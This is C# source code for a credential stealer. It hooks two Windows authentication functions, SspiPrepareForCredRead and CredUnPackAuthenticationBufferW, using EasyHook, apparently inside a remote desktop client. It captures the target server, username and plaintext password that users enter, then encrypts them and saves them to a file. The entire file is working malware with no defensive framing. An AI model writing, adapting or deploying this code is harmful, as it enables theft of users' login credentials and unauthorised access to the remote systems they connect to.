using System;
using System.Runtime.InteropServices;

namespace RemoteViewing
{
    class Program
    {
        // Globals
        //================================
        static String sTargetHost = String.Empty;

        // Hooks
        //================================
        public static void SspiPrepareForCredReadHook()
        {
            var hook = EasyHook.LocalHook.Create(
                EasyHook.LocalHook.GetProcAddress("SspiCli.dll", "SspiPrepareForCredRead"),
                new API.DELEGATES.SspiPrepareForCredRead(SspiPrepareForCredReadDetour),
                null);

            hook.ThreadACL.SetExclusiveACL(new int[] { 0 }); // Hook all threads except our thread
        }

        public static void CredUnPackAuthenticationBufferWHook()
        {
            var hook = EasyHook.LocalHook.Create(
                EasyHook.LocalHook.GetProcAddress("Credui.dll", "CredUnPackAuthenticationBufferW"),
                new API.DELEGATES.CredUnPackAuthenticationBufferW(CredUnPackAuthenticationBufferWDetour),
                null);

            hook.ThreadACL.SetExclusiveACL(new int[] { 0 }); // Hook all threads except our thread
        }

        // Function detours
        //================================
        static private UInt32 SspiPrepareForCredReadDetour(IntPtr AuthIdentity, IntPtr pszTargetName, IntPtr pCredmanCredentialType, IntPtr ppszCredmanTargetName)
        {
            // Store server string for later reference
            sTargetHost = Marshal.PtrToStringUni(pszTargetName);
            return API.SspiPrepareForCredRead(AuthIdentity, pszTargetName, pCredmanCredentialType, ppszCredmanTargetName);
        }

        static private Boolean CredUnPackAuthenticationBufferWDetour(UInt32 dwFlags, IntPtr pAuthBuffer, UInt32 cbAuthBuffer, IntPtr pszUserName, IntPtr pcchMaxUserName, IntPtr pszDomainName, IntPtr pcchMaxDomainName, IntPtr pszPassword, IntPtr pcchMaxPassword)
        {
            // Call Credui!CredUnPackAuthenticationBufferW
            Boolean CallRes = API.CredUnPackAuthenticationBufferW(dwFlags, pAuthBuffer, cbAuthBuffer, pszUserName, pcchMaxUserName, pszDomainName, pcchMaxDomainName, pszPassword, pcchMaxPassword);
            
            // Read API pointer data
            String sUser = Marshal.PtrToStringUni(pszUserName);
            String sPass = Marshal.PtrToStringUni(pszPassword);

            // Create result string
            String RemoteView = "//----------------\n" +
                                "// Server : " + sTargetHost + "\n" +
                                "// User   : " + sUser + "\n" +
                                "// Pass   : " + sPass + "\n" +
                                "//----------------\n";

            // Encrypt and write to disk
            Handler.EncryptTextToFile(RemoteView, Handler.GetOutputFilePath(), Handler.Key, Handler.IV);

            return CallRes;
        }

        static void Main(string[] args)
        {
            // Install hooks
            SspiPrepareForCredReadHook();
            CredUnPackAuthenticationBufferWHook();
        }
    }
}
